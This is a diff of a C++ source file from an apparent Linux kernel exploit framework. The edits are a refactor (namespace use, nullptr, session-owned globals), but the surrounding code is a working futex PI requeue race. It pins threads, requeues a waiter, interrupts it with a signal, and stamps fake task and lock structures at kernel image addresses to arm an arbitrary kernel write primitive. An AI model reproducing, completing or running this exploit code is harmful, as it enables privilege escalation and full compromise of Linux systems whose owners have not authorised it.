@@ -12,6 +12,8 @@
 #include "session/exploit_session.hpp"
 #include "target.h"
 
+using namespace ghostlock;
+
 /* Resident Multicast Waiter route owner (CPP13). The process-level instance
  * lives at file scope so every inlined access expands exactly like the
  * validated direct reference; the kernel5_resident_* wrappers in
@@ -27,7 +29,7 @@ static double fops_elapsed_ms(struct timespec *ref) {
 }
 
 static const struct execution_settings *resident_execution_settings(void) {
-    return target_profile_execution(&g_target_profile);
+    return target_profile_execution(&g_exploit_session.profile);
 }
 
 static void multicast_waiter_interrupt(int sig) {
@@ -48,20 +50,22 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
         uintptr_t target, uintptr_t value,
         uintptr_t lock) {
     size_t size = context->layout.buffer_size;
+    /* Kept dynamic: the size comes from validated profile geometry and
+     * heap-backing it would enter the race window (CPP17 review, retained). */
     __extension__ unsigned char b[size];
     size_t o = context->layout.waiter_offset;
     memset(b, 0, sizeof(b));
     /* Same pure encoder as the one-shot route; the resident also stamps the
      * erase words at the waiter head. */
-    if (!ghostlock::encode_multicast_waiter(
+    if (!encode_multicast_waiter(
             {reinterpret_cast<std::byte *>(b), size},
             o, context->layout.task_offset, context->layout.lock_offset,
             context->task, lock)) {
         return -1;
     }
     if (target) {
-        ghostlock::support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
-        ghostlock::support::put64(b, o + 8, value);
+        support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
+        support::put64(b, o + 8, value);
     }
     uint16_t family = AF_UNSPEC;
     memcpy(b + 8, &family, sizeof(family));
@@ -75,16 +79,16 @@ static void *multicast_waiter_worker(void *arg) {
     sigset_t set;
     sigemptyset(&set);
     sigaddset(&set, SIGUSR1);
-    pthread_sigmask(SIG_UNBLOCK, &set, NULL);
+    pthread_sigmask(SIG_UNBLOCK, &set, nullptr);
     atomic_store(&context->waiter_tid, (int) syscall(SYS_gettid));
-    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
     atomic_store(&context->waiter_has_lock2, 1);
     while (!atomic_load(&context->owner_has_lock1)) sched_yield();
     atomic_store(&context->waiter_waiting, 1);
-    ghostlock::support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
-            0, NULL, &context->lock1_futex, 0);
+    support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
+            0, nullptr, &context->lock1_futex, 0);
     context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-    if (context->socket_fd < 0) return NULL;
+    if (context->socket_fd < 0) return nullptr;
     multicast_waiter_stamp(context, 0, 0, context->lock);
     atomic_store(&context->waiter_ready, 1);
     while (!atomic_load(&context->stop_requested)) {
@@ -99,26 +103,26 @@ static void *multicast_waiter_worker(void *arg) {
     }
     uint32_t dummy = 0x80000000U | (uint32_t) getpid();
     struct timespec z = {0, 0};
-    ghostlock::support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
-    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, nullptr, 0);
+    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
     while (!atomic_load(&context->owner_done)) sched_yield();
     close(context->socket_fd);
     context->socket_fd = -1;
-    return NULL;
+    return nullptr;
 }
 
 static void *multicast_owner_worker(void *arg) {
     auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
     pin_to_core((size_t) context->main_cpu);
     while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
-    ghostlock::support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
     atomic_store(&context->owner_has_lock1, 1);
     atomic_store(&context->owner_waiting, 1);
-    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-    ghostlock::support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
+    support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
+    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
     atomic_store(&context->owner_done, 1);
-    return NULL;
+    return nullptr;
 }
 
 static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
@@ -130,11 +134,11 @@ static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
 
 static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
     if (context->waiter_worker_started) {
-        pthread_join(context->waiter_worker, NULL);
+        pthread_join(context->waiter_worker, nullptr);
         context->waiter_worker_started = 0;
     }
     if (context->owner_worker_started) {
-        pthread_join(context->owner_worker, NULL);
+        pthread_join(context->owner_worker, nullptr);
         context->owner_worker_started = 0;
     }
     if (context->socket_fd >= 0) {
@@ -158,25 +162,25 @@ int MulticastWaiterRoute::start() noexcept {
         return 0;
     }
     MulticastWaiterLayout layout_value =
-            target_profile_multicast_waiter_layout(&g_target_profile);
+            target_profile_multicast_waiter_layout(&g_exploit_session.profile);
     const struct execution_settings *execution = resident_execution_settings();
     context->init(
-            &ghostlock::g_exploit_session.race, NULL, execution, layout_value, 1);
+            &g_exploit_session.race, nullptr, execution, layout_value, 1);
     context->main_cpu = runtime_config_snapshot().main_cpu;
     context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
     uintptr_t bss = resolved_addresses_data_alias(
-            &g_resolved_addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
+            &g_exploit_session.addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
     context->lock = bss + layout_value.fake_lock_offset;
     context->task = bss + layout_value.fake_task_offset;
     struct sigaction sa = {};
     sa.sa_handler = multicast_waiter_interrupt;
     sigemptyset(&sa.sa_mask);
-    if (sigaction(SIGUSR1, &sa, NULL) != 0) return 0;
-    if (pthread_create(&context->waiter_worker, NULL,
+    if (sigaction(SIGUSR1, &sa, nullptr) != 0) return 0;
+    if (pthread_create(&context->waiter_worker, nullptr,
             multicast_waiter_worker, context) != 0)
         return 0;
     context->waiter_worker_started = 1;
-    if (pthread_create(&context->owner_worker, NULL,
+    if (pthread_create(&context->owner_worker, nullptr,
             multicast_owner_worker, context) != 0)
         return 0;
     context->owner_worker_started = 1;
@@ -192,7 +196,7 @@ int MulticastWaiterRoute::start() noexcept {
     }
     usleep(execution->multicast_post_requeue_settle_us);
     errno = 0;
-    long r = ghostlock::support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
+    long r = support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
             1, (void *) 0, &context->lock1_futex, 0);
     context->condition_futex = 1;
     syscall(SYS_tgkill, getpid(), atomic_load(&context->waiter_tid), SIGUSR1);
@@ -238,7 +242,7 @@ void MulticastWaiterRoute::stop() noexcept {
     multicast_waiter_destroy(context);
     /* SESSION-04: the route owns only its route resources; reaping the
      * HeapContext references is the session's step after destroy. */
-    ghostlock::g_exploit_session.release_resident_heap();
+    g_exploit_session.release_resident_heap();
     pr_success("5.x resident writer disarmed\n");
 }
 
